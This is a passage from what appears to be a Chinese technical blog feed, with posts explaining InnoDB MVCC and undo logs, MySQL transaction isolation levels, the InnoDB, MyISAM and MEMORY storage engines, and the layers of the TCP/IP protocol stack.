title="什么是回滚段？"></a>什么是回滚段？</h4><p>存储undo日志的地方，是回滚段。</p><p>undo日志和回滚段和InnoDB的MVCC密切相关，这里举个例子展开说明一下。</p><p><strong>栗子</strong>：</p><p>t(id PK, name);</p><img src="/2018/08/14/2018-08-14-InnoDB并发控制/pic2.webp"><p>此时没有事务未提交，故回滚段是空的。</p><p>接着启动了一个事务：</p><ul><li>start trx;</li><li>delete (1, shenjian);</li><li>update set(3, lisi) to (3, xxx);</li><li>insert (4, wangwu);</li></ul><p>并且事务处于未提交的状态。</p><img src="/2018/08/14/2018-08-14-InnoDB并发控制/pic3.webp"><p>可以看到：</p><ol><li>被<strong>删除前</strong>的(1, shenjian)作为旧版本数据，进入了回滚段；</li><li>被<strong>修改前</strong>的(3, lisi)作为旧版本数据，进入了回滚段；</li><li>被<strong>插入的</strong>数据，PK(4)进入了回滚段；</li></ol><p>接下来，假如事务rollback，此时可以通过回滚段里的undo日志回滚。</p><p><em>画外音：假设事务提交，回滚段里的undo日志可以删除。</em></p><img src="/2018/08/14/2018-08-14-InnoDB并发控制/pic4.webp"><p>可以看到：</p><ol><li>被删除的旧数据恢复了；</li><li>被修改的旧数据也恢复了；</li><li>被插入的数据，删除了；</li></ol><img src="/2018/08/14/2018-08-14-InnoDB并发控制/pic5.webp"><p>事务回滚成功，一切如故。</p><h3 id="InnoDB是基于多版本并发控制的存储引擎"><a href="#InnoDB是基于多版本并发控制的存储引擎" class="headerlink" title="InnoDB是基于多版本并发控制的存储引擎"></a>InnoDB是基于多版本并发控制的存储引擎</h3><p>InnoDB是高并发互联网场景最为推荐的存储引擎，根本原因，就是其<strong>多版本并发控制</strong>（Multi Version Concurrency Control, MVCC）。行锁，并发，事务回滚等多种特性都和MVCC相关。</p><p>MVCC就是通过“读取旧版本数据”来降低并发事务的锁冲突，提高任务的并发度。</p><p><strong>核心问题：</strong></p><p><strong>旧版本数据存储在哪里？</strong></p><p><strong>存储旧版本数据，对MySQL和InnoDB原有架构是否有巨大冲击？</strong></p><p>通过上文undo日志和回滚段的铺垫，这两个问题就非常好回答了：</p><ol><li>旧版本数据存储在回滚段里；</li><li>对MySQL和InnoDB原有架构体系冲击不大</li></ol><p>InnoDB的内核，会对所有row数据增加三个内部属性：</p><ol><li><strong>DB_TRX_ID</strong>，6字节，记录每一行最近一次修改它的事务ID；</li><li><strong>DB_ROLL_PTR</strong>，7字节，记录指向回滚段undo日志的指针；</li><li><strong>DB_ROW_ID</strong>，6字节，单调递增的行ID；</li></ol><p><strong>InnoDB为何能够做到这么高的并发？</strong></p><p>回滚段里的数据，其实是历史数据的快照（snapshot），这些数据是不会被修改，select可以肆无忌惮的并发读取他们。</p><p><strong>快照读</strong>（Snapshot Read），这种<strong>一致性不加锁的读</strong>（Consistent Nonlocking Read），就是InnoDB并发如此之高的核心原因之一。</p><p>这里的<strong>一致性</strong>是指，事务读取到的数据，要么是事务开始前就已经存在的数据（当然，是其他已提交事务产生的），要么是事务自身插入或者修改的数据。</p><p><strong>什么样的select是快照读？</strong></p><p>除非显示加锁，普通的select语句都是快照读，例如：</p><ul><li>select * from t where id&gt;2;</li></ul><p>这里的显示加锁，非快照读是指：</p><ul><li>select * from t where id&gt;2 <strong>lock in share mode</strong>;</li><li>select * from t where id&gt;2 <strong>for update</strong>;</li></ul><p>问题来了，这些显示加锁的读，是什么读？会加什么锁？和事务的隔离级别又有什么关系？</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li>常见并发控制保证数据一致性的方法有<strong>锁</strong>，<strong>数据多版本</strong>；</li><li><strong>普通锁</strong>串行，<strong>读写锁</strong>读读并行，<strong>数据多版本</strong>读写并行；</li><li><strong>redo日志</strong>保证已提交事务的ACID特性，设计思路是，通过顺序写替代随机写，提高并发；</li><li><strong>undo日志</strong>用来回滚未提交的事务，它存储在回滚段里；</li><li>InnoDB是基于<strong>MVCC</strong>的存储引擎，它利用了存储在回滚段里的undo日志，即数据的旧版本，提高并发；</li><li>InnoDB之所以并发高，快照读不加锁；</li><li>InnoDB所有普通select都是快照读；</li></ol><p><em>画外音：本文的知识点均基于MySQL5.6。</em></p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
            <tag> 数据库 </tag>
            
            <tag> InnoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL事务</title>
      <link href="/2018/08/13/2018-08-13-MySQL%E4%BA%8B%E5%8A%A1/"/>
      <url>/2018/08/13/2018-08-13-MySQL%E4%BA%8B%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> MySQL的四种事务隔离级别 <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="为什么要有事务？"><a href="#为什么要有事务？" class="headerlink" title="为什么要有事务？"></a>为什么要有事务？</h3><p>事务广泛的运用于订单系统、银行系统等多种场景。如果有以下一个场景：A用户和B用户是银行的储户。现在A要给B转账500元。那么需要做以下几件事：</p><ol><li>检查A的账户余额&gt;500元；</li><li>A账户扣除500元；</li><li>B账户增加500元；</li></ol><p>正常的流程走下来，A账户扣了500，B账户加了500，皆大欢喜。那如果A账户扣了钱之后，系统出故障了呢？A白白损失了500，而B也没有收到本该属于他的500。</p><p>以上的案例中，隐藏着一个前提条件：A扣钱和B加钱，要么同时成功，要么同时失败。事务的需求就在于此。</p><h3 id="事务是什么？"><a href="#事务是什么？" class="headerlink" title="事务是什么？"></a>事务是什么？</h3><p>与其给事务定义，不如说一说事务的特性。众所周知，事务需要满足ACID四个特性：</p><ul><li><strong>原子性 (atomicity)</strong>：一个事务的执行被视为一个不可分割的最小单元。事务里面的操作，要么全部成功执行，要么全部失败回滚，不可以只执行其中的一部分。</li><li><strong>一致性 (consistency)</strong>：数据库总是从一个一致性的状态转换到另外一个一致性的状态。如果上述例子中第2个操作执行后系统崩溃，保证A和B的金钱总计是不会变的。</li><li><strong>隔离性 (isolation)</strong>：通常来说，事务之间的行为不应该互相影响。然而实际情况中，事务相互影响的程度受到隔离级别的影响，文章后面会详述。</li><li><strong>持久性 (durability)</strong>：事务提交之后，需要将提交的事务持久化到磁盘，即使系统崩溃，提交的数据也不应该丢失。</li></ul><h3 id="事务的并发问题"><a href="#事务的并发问题" class="headerlink" title="事务的并发问题"></a>事务的并发问题</h3><p>事务的并发会带来几个问题：</p><ul><li><strong>脏读</strong>：事务A读取了事务B更新的数据，然后B回滚操作，那么A读取到的数据是脏数据</li><li><strong>不可重复读</strong>：事务A多次读取同一数据，事务B在事务A多次读取的过程中，对数据作了更新并提交，导致事务A多次读取同一数据时，结果不一致。</li><li><strong>幻读</strong>：系统管理员A将数据库中所有学生的成绩从具体分数改为ABCDE等级，但是系统管理员B就在这个时候插入了一条具体分数的记录，当系统管理员A改结束后发现还有一条记录没有改过来，就好像发生了幻觉一样，这就叫幻读。</li></ul><p>注意，不可重复读的和幻读很容易混淆，不可重复读侧重于修改，幻读侧重于新增或删除。解决不可重复读的问题只需锁住满足条件的行，解决幻读需要锁表。</p><h3 id="事务的四种隔离级别"><a href="#事务的四种隔离级别" class="headerlink" title="事务的四种隔离级别"></a>事务的四种隔离级别</h3><p>事务的隔离性受到隔离级别的影响，那么事务的隔离级别是什么呢？事务的隔离级别可以认为是事务的”自私”程度，它定义了事务之间的可见性。隔离级别分为以下几种：</p><ul><li><strong>读未提交（read-uncommitted）</strong>：事务A对数据做的修改，即使没有提交，对于事务B来说也是可见的，这种问题叫脏读。这是隔离程度较低的一种隔离级别，在实际运用中会引起很多问题，因此一般不常用。</li><li><strong>不可重复读（read-committed）</strong>：大多数数据库系统的默认隔离级别，一个事务开始时，只能“看见”已经提交的事务所做的修改，一个事务从开始直到提交之前，所做的任何修改对其他事务都是不可见的。</li><li><strong>可重复读（repeatable-read）</strong>：当某个事务在读取某个范围内的值的时候，另外一个事务在这个范围内插入了新记录，那么之前的事务再次读取这个范围的值，会读取到新插入的数据。Mysql默认的隔离级别是RR，然而mysql的innoDB引擎间隙锁成功解决了幻读的问题。</li><li><strong>可串行化（serializable）</strong>：最高级别，通过强制事务串行执行，避免了幻读问题，会在读取的每一行数据上都加锁，可能导致大量的超时和锁争用的问题。</li></ul><table><thead><tr><th>事务隔离级别</th><th>脏读</th><th>不可重复读</th><th>幻读</th></tr></thead><tbody><tr><td>读未提交（read-uncommitted）</td><td>是</td><td>是</td><td>是</td></tr><tr><td>不可重复读（read-committed）</td><td>否</td><td>是</td><td>是</td></tr><tr><td>可重复读（repeatable-read）</td><td>否</td><td>否</td><td>是</td></tr><tr><td>可串行化（serializable）</td><td>否</td><td>否</td><td>否</td></tr></tbody></table><p>为了帮助理解四种隔离级别，这里举个例子。</p><p>如下图，事务A和事务B先后开启，并对数据1进行多次更新。四个小人在不同的时刻开启事务，可能看到数据1的哪些值呢？</p><img src="/2018/08/13/2018-08-13-MySQL事务/pic1.png"><ul><li>第一个小人，可能读到1-20之间的任何一个。因为未提交读的隔离级别下，其他事务对数据的修改也是对当前事务可见的。</li><li>第二个小人，可能读到1，10和20，他只能读到其他事务已经提交了的数据。</li><li>第三个小人，读到的数据去决于自身事务开启的时间点。在事务开启时，读到的是多少，那么在事务提交之前读到的值就是多少。</li><li>第四个小人，只有在A end 到B start之间开启，才有可能读到数据，而在事务A和事务B执行的期间是读不到数据的。因为第四小人读数据是需要加锁的，事务A和B执行期间，会占用数据的写锁，导致第四个小人等待锁。</li></ul><p>很显然，隔离级别越高，它所带来的资源消耗也就越大(锁)，因此它的并发性能越低。准确的说，在可串行化的隔离级别下，是没有并发的。</p><img src="/2018/08/13/2018-08-13-MySQL事务/pic2.png"><h3 id="MySQL中的事务"><a href="#MySQL中的事务" class="headerlink" title="MySQL中的事务"></a>MySQL中的事务</h3><p>事务的实现是基于数据库的存储引擎。不同的存储引擎对事务的支持程度不一样。mysql中支持事务的存储引擎有innoDB和NDB。innoDB是mysql默认的存储引擎，默认的隔离级别是RR，并且在RR的隔离级别下更进一步，通过多版本<strong>并发控制</strong>（MVCC，Multiversion Concurrency Control ）解决不可重复读问题，加上间隙锁（也就是并发控制）解决幻读问题。因此innoDB的RR隔离级别其实实现了串行化级别的效果，而且保留了比较好的并发性能。</p><p>事务的隔离性是通过锁实现，而事务的原子性、一致性和持久性则是通过事务日志实现。说到事务日志，不得不说的就是redo和undo。</p><h4 id="redo-log"><a href="#redo-log" class="headerlink" title="redo log"></a>redo log</h4><p>在innoDB的存储引擎中，事务日志通过重做(redo)日志和innoDB存储引擎的日志缓冲(InnoDB Log Buffer)实现。</p><p>事务开启时，事务中的操作，都会先写入存储引擎的日志缓冲中，在事务提交之前，这些缓冲的日志都需要提前刷新到磁盘上持久化，这就是DBA们口中常说的“日志先行”(Write-Ahead Logging)。存储引擎在修改表的数据时只需要修改其内存拷贝，再把该修改行为记录到持久在硬盘上的事务日志中，而不用每次都将修改的数据本身持久到磁盘。</p><p>当事务提交之后，在Buffer Pool（Innodb维护了一个缓存区域叫做Buffer Pool，用来缓存数据和索引在内存中）中映射的数据才会在后台慢慢刷新到磁盘。此时如果数据库崩溃或者宕机，那么当系统重启进行恢复时，就可以根据redo log中记录的日志，把数据库恢复到崩溃前的一个状态。未完成的事务，可以继续提交，也可以选择回滚，这基于恢复的策略而定。</p><p>在系统启动的时候，就已经为redo log分配了一块连续的存储空间,以顺序追加的方式记录Redo Log,通过顺序IO来改善性能。所有的事务共享redo log的存储空间，它们的Redo Log按语句的执行顺序，依次交替的记录在一起。如下一个简单示例：</p><ul><li>记录1：&lt;trx1, insert…&gt;</li><li>记录2：&lt;trx2, delete…&gt;</li><li>记录3：&lt;trx3, update…&gt;</li><li>记录4：&lt;trx1, update…&gt;</li><li>记录5：&lt;trx3, insert…&gt;</li></ul><h4 id="undo-log"><a href="#undo-log" class="headerlink" title="undo log"></a>undo log</h4><p>undo log主要为事务的回滚服务。在事务执行的过程中，除了记录redo log，还会记录一定量的undo log。undo log记录了数据在每个操作前的状态，如果事务执行过程中需要回滚，就可以根据undo log进行回滚操作。单个事务的回滚，只会回滚当前事务做的操作，并不会影响到其他的事务做的操作。</p><p>以下是undo+redo事务的简化过程:</p><p>假设有2个数值，分别为A和B,值为1，2</p><ol><li>start transaction;</li><li>记录 A=1 到undo log;</li><li>update A = 3；</li><li>记录 A=3 到redo log；</li><li>记录 B=2 到undo log；</li><li>update B = 4；</li><li>记录B = 4 到redo log；</li><li>将redo log刷新到磁盘</li><li>commit</li></ol><p>在1-8的任意一步系统宕机，事务未提交，该事务就不会对磁盘上的数据做任何影响。如果在8-9之间宕机，恢复之后可以选择回滚，也可以选择继续完成事务提交，因为此时redo log已经持久化。若在9之后系统宕机，内存映射中变更的数据还来不及刷回磁盘，那么系统恢复之后，可以根据redo log把数据刷回磁盘。</p><p>所以，redo log其实保障的是事务的持久性和一致性，而undo log则保障了事务的原子性。</p><h4 id="分布式事务"><a href="#分布式事务" class="headerlink" title="分布式事务"></a>分布式事务</h4><p>分布式事务的实现方式有很多，既可以采用innoDB提供的原生的事务支持，也可以采用消息队列来实现分布式事务的最终一致性。这里我们主要聊一下innoDB对分布式事务的支持。</p><img src="/2018/08/13/2018-08-13-MySQL事务/pic3.png"><p>如图，mysql的分布式事务模型。模型中分三块：应用程序（AP）、资源管理器（RM）、事务管理器（TM）。</p><ul><li>应用程序定义了事务的边界，指定需要做哪些事务；</li><li>资源管理器提供了访问事务的方法，通常一个数据库就是一个资源管理器；</li><li>事务管理器协调参与了全局事务中的各个事务。</li></ul><p>分布式事务采用两段式提交（two-phase commit）的方式。第一阶段所有的事务节点开始准备，告诉事务管理器ready。第二阶段事务管理器告诉每个节点是commit还是rollback。如果有一个节点失败，就需要全局的节点全部rollback，以此保障事务的原子性。</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL存储引擎</title>
      <link href="/2018/08/12/2018-08-12-MySQL%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/"/>
      <url>/2018/08/12/2018-08-12-MySQL%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> MySQL常见的三种存储引擎 <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="存储引擎"><a href="#存储引擎" class="headerlink" title="存储引擎"></a>存储引擎</h3><p>数据库存储引擎是数据库底层软件组织，数据库管理系统（DBMS）使用数据引擎进行创建、查询、更新和删除数据。不同的存储引擎提供不同的存储机制、索引技巧、锁定水平等功能，使用不同的存储引擎，还可以 获得特定的功能。现在许多不同的数据库管理系统都支持多种不同的数据引擎。MySql的核心就是插件式存储引擎。</p><p>下图是MySQL的体系结构图，可以大致看一下存储引擎的位置：</p><img src="/2018/08/12/2018-08-12-MySQL存储引擎/pic1.png"><p>我们来查看MySQL支持的存储引擎有哪些:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SHOW ENGINES; </span><br><span class="line"></span><br><span class="line">Engine            |Support|Comment                                                                         |Transactions|XA |Savepoints|</span><br><span class="line">------------------|-------|--------------------------------------------------------------------------------|------------|---|----------|</span><br><span class="line">CSV               |YES    |CSV storage engine                                                              |NO          |NO |NO        |</span><br><span class="line">MRG_MyISAM        |YES    |Collection of identical MyISAM tables                                           |NO          |NO |NO        |</span><br><span class="line">MyISAM            |YES    |MyISAM storage engine                                                           |NO          |NO |NO        |</span><br><span class="line">SEQUENCE          |YES    |Generated tables filled with sequential values                                  |YES         |NO |YES       |</span><br><span class="line">PERFORMANCE_SCHEMA|YES    |Performance Schema                                                              |NO          |NO |NO        |</span><br><span class="line">MEMORY            |YES    |Hash based, stored in memory, useful for temporary tables                       |NO          |NO |NO        |</span><br><span class="line">Aria              |YES    |Crash-safe tables with MyISAM heritage                                          |NO          |NO |NO        |</span><br><span class="line">InnoDB            |DEFAULT|Supports transactions, row-level locking, foreign keys and encryption for tables|YES         |YES|YES       |</span><br></pre></td></tr></table></figure><p>可以看到，MySQL支持的存储引擎有很多种，但在本文只讲其中最为常用的三种：InnoDB、MyISAM、MEMORY。</p><h3 id="InnoDB"><a href="#InnoDB" class="headerlink" title="InnoDB"></a>InnoDB</h3><p>InnoDB是MySQL的默认存储引擎，也是事务性数据库的首选引擎。</p><p>主要特性：</p><ul><li>支持ACID事务（具有提交、回滚和崩溃恢复能力的事务安全）。</li><li>锁定在行级并且也在SELECT语句中提供一个类似<a href="http://lib.csdn.net/base/oracle" target="_blank" rel="noopener">Oracle</a>的非锁定读。在SQL查询中，可以自由地将InnoDB类型的表和其他MySQL的表类型混合起来，甚至在同一个查询中也可以混合。</li><li>在主内存中缓存数据和索引而维持它自己的缓冲池。InnoDB将它的表和索引在一个逻辑表空间中，表空间可以包含数个文件（或原始磁盘文件）。这与MyISAM表不同，比如在MyISAM表中每个表被存放在分离的文件中。InnoDB表可以是任何尺寸，即使在文件尺寸被限制为2GB的操作系统上。</li><li>支持外键完整性约束，存储表中的数据时，每张表的存储都按主键顺序存放。如果没有显示在表定义时指定主键，InnoDB会为每一行生成一个6字节的ROWID，并以此作为主键。</li><li>不创建目录。使用InnoDB时，MySQL将在MySQL数据目录下创建一个名为ibdata1的10MB大小的自动扩展数据文件，以及两个名为ib_logfile0和ib_logfile1的5MB大小的日志文件。</li></ul><p>可能的缺点：</p><ul><li>不支持FULLTEXT类型的索引</li><li>没有保存表的行数，在执行select count(*) from 表名 时，需要遍历扫描全表</li></ul><p>适用场景：</p><ul><li>经常需要更新的表，适合处理多重并发的更新请求</li><li>支持事务</li><li>外键约束</li><li>可以从灾难中恢复（通过bin-log日志等）</li><li>支持自动增加列属性auto_increment</li></ul><h3 id="MyISAM"><a href="#MyISAM" class="headerlink" title="MyISAM"></a>MyISAM</h3><p>MyIsam引擎是MySQL主流引擎之一，基于ISAM存储引擎，并对其进行扩展。</p><p>主要特性：</p><ul><li>大文件（达到63位文件长度）在支持大文件的文件系统和操作系统上被支持</li><li>当把删除和更新及插入操作混合使用的时候，动态尺寸的行产生更少碎片。这要通过合并相邻被删除的块，以及若下一个块被删除，就扩展到下一块自动完成</li><li>每个MyISAM表最大索引数是64，这可以通过重新编译来改变。每个索引最大的列数是16</li><li>最大的键长度是1000字节，这也可以通过编译来改变，对于键长度超过250字节的情况，一个超过1024字节的键将被用上</li><li>BLOB和TEXT列可以被索引</li><li>NULL被允许在索引的列中，这个值占每个键的0~1个字节</li><li>所有数字键值以高字节优先被存储以允许一个更高的索引压缩</li><li>每个MyISAM类型的表都有一个AUTO_INCREMENT的内部列，当INSERT和UPDATE操作的时候该列被更新，同时AUTO_INCREMENT列将被刷新。所以说，MyISAM类型表的AUTO_INCREMENT列更新比InnoDB类型的AUTO_INCREMENT更快</li><li>可以把数据文件和索引文件放在不同目录</li><li>每个字符列可以有不同的字符集</li><li>有VARCHAR的表可以固定或动态记录长度</li><li>VARCHAR和CHAR列可以多达64KB</li></ul><p>可能的缺点：</p><ul><li>不能在表损坏后恢复数据</li></ul><p>适用场景：</p><ul><li>MyIsam极度强调快速读取</li><li>MyIsam表中自动存储了表的行数，需要时直接获取即可</li><li>适用于不需要事物支持、外键功能、及需要对整个表加锁的情形</li></ul><h3 id="MEMORY"><a href="#MEMORY" class="headerlink" title="MEMORY"></a>MEMORY</h3><p>MEMORY存储引擎将表中的数据存储到内存中，<strong>为查询和引用其他表数据提供快速访问</strong>。</p><p>主要特性：</p><ul><li>MEMORY表的每个表可以有多达32个索引，每个索引16列，以及500字节的最大键长度</li><li>MEMORY存储引擎执行HASH和BTREE缩影</li><li>可以在一个MEMORY表中有非唯一键值</li><li>MEMORY表使用一个固定的记录长度格式</li><li>MEMORY不支持BLOB或TEXT列</li><li>MEMORY支持AUTO_INCREMENT列和对可包含NULL值的列的索引</li><li>MEMORY表在所由客户端之间共享（就像其他任何非TEMPORARY表）</li><li>MEMORY表内存被存储在内存中，内存是MEMORY表和服务器在查询处理时的空闲中，创建的内部表共享</li><li>当不再需要MEMORY表的内容时，要释放被MEMORY表使用的内存，应该执行 DELETE FROM或 TRUNCATE TABLE，或者删除整个表（使用DROP TABLE）</li></ul><p>可能的缺点：</p><ul><li>要求存储的数据是数据长度不变的格式，Blob和Text类型数据不可用（长度不固定）</li><li>用完表格后表格便被删除</li></ul><p>适用场景：</p><ul><li>那些内容变化不频繁的代码表，或者作为统计操作的中间结果表，便于高效地堆中间结果进行分析并得到最终的统计结果</li><li>目标数据比较小，而且非常频繁的进行访问，在内存中存放数据，如果太大的数据会造成内存溢出。可以通过参数max_heap_table_size控制Memory表的大小，限制Memory表的最大的大小</li><li>数据是临时的，而且必须立即能取出用到，于是可存放在内存中</li><li>存储在Memory表中的数据如果突然间丢失的话也没有太大的关系</li></ul><h3 id="存储引擎的选择"><a href="#存储引擎的选择" class="headerlink" title="存储引擎的选择"></a>存储引擎的选择</h3><p>不同的数据处理选择适合的存储引擎是使用MySQL的一大优势。</p><img src="/2018/08/12/2018-08-12-MySQL存储引擎/pic2.png"><p>InnoDB： <strong>支持事务处理，支持外键，支持崩溃修复能力和并发控制。</strong>如果需要对事务的完整性要求比较高（比如银行），要求实现并发控制（比如售票），那选择InnoDB有很大的优势。如果需要频繁的更新、删除操作的数据库，也可以选择InnoDB，因为支持事务的提交（commit）和回滚（rollback）。</p><p>MyISAM： <strong>插入数据快，空间和内存使用比较低。</strong>如果表主要是用于插入新记录和读出记录，那么选择MyISAM能实现处理高效率。如果应用的完整性、并发性要求比 较低，也可以使用。</p><p>MEMORY： <strong>所有的数据都在内存中，数据的处理速度快，但是安全性不高。</strong>如果需要很快的读写速度，对数据的安全性要求较低，可以选择MEMOEY。它对表的大小有要求，不能建立太大的表。所以，这类数据库只使用在相对较小的数据库表。</p><p>注意：同一个数据库也可以使用多种存储引擎的表。如果一个表要求比较高的事务处理，可以选择InnoDB。这个数据库中可以将查询要求比较高的表选择MyISAM存储。如果该数据库需要一个用于查询的临时表，可以选择MEMORY存储引擎。</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
            <tag> 数据库 </tag>
            
            <tag> 存储引擎 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TCP/IP协议栈</title>
      <link href="/2018/08/01/2018-08-01-TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88/"/>
      <url>/2018/08/01/2018-08-01-TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> 一些TCP/IP协议簇中必知必会的十大问题 <i class="fa fa-quote-right"></i></p><a id="more"></a><img src="/2018/08/01/2018-08-01-TCPIP协议栈/pic1.jpeg"><h3 id="TCP-IP模型"><a href="#TCP-IP模型" class="headerlink" title="TCP/IP模型"></a>TCP/IP模型</h3><h4 id="模型概要"><a href="#模型概要" class="headerlink" title="模型概要"></a>模型概要</h4><p>TCP/IP协议模型（Transmission Control Protocol/Internet Protocol），包含了一系列构成互联网基础的网络协议，是Internet的核心协议。</p><p>基于TCP/IP的参考模型将协议分成四个层次，它们分别是链路层、网络层、传输层和应用层。下图表示TCP/IP模型与OSI模型各层的对照关系：</p><img src="/2018/08/01/2018-08-01-TCPIP协议栈/pic2.jpeg"><p>TCP/IP协议族按照层次由上到下，层层包装：</p><ul><li>第一层是应用层，这里面有http，ftp,等等我们熟悉的协议。</li><li>第二层是传输层，著名的TCP和UDP协议就在这个层次。</li><li>第三层是网络层，IP协议就在这里，它负责对数据加上IP地址和其他的数据以确定传输的目标。</li><li>第四层是数据链路层，这个层次为待传送的数据加入一个以太网协议头，并进行CRC编码，为最后的数据传输做准备。</li></ul><h4 id="每层职责"><a href="#每层职责" class="headerlink" title="每层职责"></a>每层职责</h4><img src="/2018/08/01/2018-08-01-TCPIP协议栈/pic3.jpeg"><p>上图清楚地表示了TCP/IP协议中每个层的作用，而TCP/IP协议通信的过程其实就对应着数据入栈与出栈的过程：</p><ul><li>入栈的过程，数据发送方每层不断地封装首部与尾部，添加一些传输的信息，确保能传输到目的地。</li><li>出栈的过程，数据接收方每层不断地拆除首部与尾部，得到最终传输的数据。</li></ul><img src="/2018/08/01/2018-08-01-TCPIP协议栈/pic4.jpeg"><p>上图以HTTP协议为例，具体说明。</p><p>我们梳理一下每层模型的职责：</p><ul><li><strong>链路层</strong>：对0和1进行分组，定义数据帧，确认主机的物理地址，传输数据；</li><li><strong>网络层</strong>：定义IP地址，确认主机所在的网络位置，并通过IP进行MAC寻址，对外网数据包进行路由转发；</li><li><strong>传输层</strong>：定义端口，确认主机上应用程序的身份，并将数据包交给对应的应用程序；</li><li><strong>应用层</strong>：定义数据格式，并按照对应的格式解读数据。</li></ul><p>再把每层模型的职责串联起来，用一句通俗易懂的话讲就是：</p><blockquote><p>当你输入一个网址并按下回车键的时候，首先，应用层协议对该请求包做了格式定义；紧接着传输层协议加上了双方的端口号，确认了双方通信的应用程序；然后网络协议加上了双方的IP地址，确认了双方的网络位置；最后链路层协议加上了双方的MAC地址，确认了双方的物理位置，同时将数据进行分组，形成数据帧，采用广播方式，通过传输介质发送给对方主机。而对于不同网段，该数据包首先会转发给网关路由器，经过多次转发后，最终被发送到目标主机。目标机接收到数据包后，采用对应的协议，对帧数据进行组装，然后再通过一层一层的协议进行解析，最终被应用层的协议解析并交给服务器处理。</p></blockquote><h3 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h3><p>物理层负责0、1比特流与物理设备电压高低、光的闪灭之间的互换。 数据链路层负责将0、1序列划分为数据帧从一个节点传输到临近的另一个节点,这些节点是通过MAC来唯一标识的(MAC,物理地址，一个主机会有一个MAC地址)。</p><img src="/2018/08/01/2018-08-01-TCPIP协议栈/pic5.jpeg"><ul><li>封装成帧: 把网络层数据报加头和尾，封装成帧,帧头中包括源MAC地址和目的MAC地址。</li><li>透明传输:零比特填充、转义字符。</li><li>可靠传输: 在出错率很低的链路上很少用，但是无线链路WLAN会保证可靠传输。</li><li>差错检测(CRC):接收者检测错误,如果发现差错，丢弃该帧。</li></ul><h3 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h3><h4 id="IP协议"><a href="#IP协议" class="headerlink" title="IP协议"></a>IP协议</h4><p>IP协议是TCP/IP协议的核心，所有的TCP，UDP，IMCP，IGMP的数据都以IP数据格式传输。要注意的是，IP不是可靠的协议，这是说，IP协议没有提供一种数据未传达以后的处理机制，这被认为是上层协议：TCP或UDP要做的事情。</p><h5 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a>IP地址</h5><p>在数据链路层中我们一般通过MAC地址来识别不同的节点，而在IP层我们也要有一个类似的地址标识，这就是IP地址。</p><p>32位IP地址分为网络位和地址位，这样做可以减少路由器中路由表记录的数目，有了网络地址，就可以限定拥有相同网络地址的终端都在同一个范围内，那么路由表只需要维护一条这个网络地址的方向，就可以找到相应的这些终端了。</p><ul><li>A类IP地址: 0.0.0.0~127.255.255.255</li><li>B类IP地址:128.0.0.0~191.255.255.255</li><li>C类IP地址:192.0.0.0~239.255.255.255</li></ul><h5 id="IP协议头"><a href="#IP协议头" class="headerlink" title="IP协议头"></a>IP协议头</h5><img src="/2018/08/01/2018-08-01-TCPIP协议栈/pic6.png"><p>这里只介绍:八位的TTL字段。这个字段规定该数据包在穿过多少个路由之后才会被抛弃。某个IP数据包每穿过一个路由器，该数据包的TTL数值就会减少1，当该数据包的TTL成为零，它就会被自动抛弃。</p><p>这个字段的最大值也就是255，也就是说一个协议包也就在路由器里面穿行255次就会被抛弃了，根据系统的不同，这个数字也不一样，一般是32或者是64。</p><h4 id="ARP及RARP协议"><a href="#ARP及RARP协议" class="headerlink" title="ARP及RARP协议"></a>ARP及RARP协议</h4><p>ARP 是根据IP地址获取MAC地址的一种协议。</p><p>ARP（地址解析）协议是一种解析协议，本来主机是完全不知道这个IP对应的是哪个主机的哪个接口，当主机要发送一个IP包的时候，会首先查一下自己的ARP高速缓存（就是一个IP-MAC地址对应表缓存）。</p><p>如果查询的IP－MAC值对不存在，那么主机就向网络发送一个ARP协议广播包，这个广播包里面就有待查询的IP地址，而直接收到这份广播的包的所有主机都会查询自己的IP地址，如果收到广播包的某一个主机发现自己符合条件，那么就准备好一个包含自己的MAC地址的ARP包传送给发送ARP广播的主机。</p><p>而广播主机拿到ARP包后会更新自己的ARP缓存（就是存放IP-MAC对应表的地方）。发送广播的主机就会用新的ARP缓存数据准备好数据链路层的的数据包发送工作。</p><p>RARP协议的工作与此相反，不做赘述。</p><h4 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h4><p>IP协议并不是一个可靠的协议，它不保证数据被送达，那么，自然的，保证数据送达的工作应该由其他的模块来完成。其中一个重要的模块就是ICMP(网络控制报文)协议。ICMP不是高层协议，而是IP层的协议。</p><p>当传送IP数据包发生错误。比如主机不可达，路由不可达等等，ICMP协议将会把错误信息封包，然后传送回给主机。给主机一个处理错误的机会，这 也就是为什么说建立在IP层以上的协议是可能做到安全的原因。</p><h3 id="ping"><a href="#ping" class="headerlink" 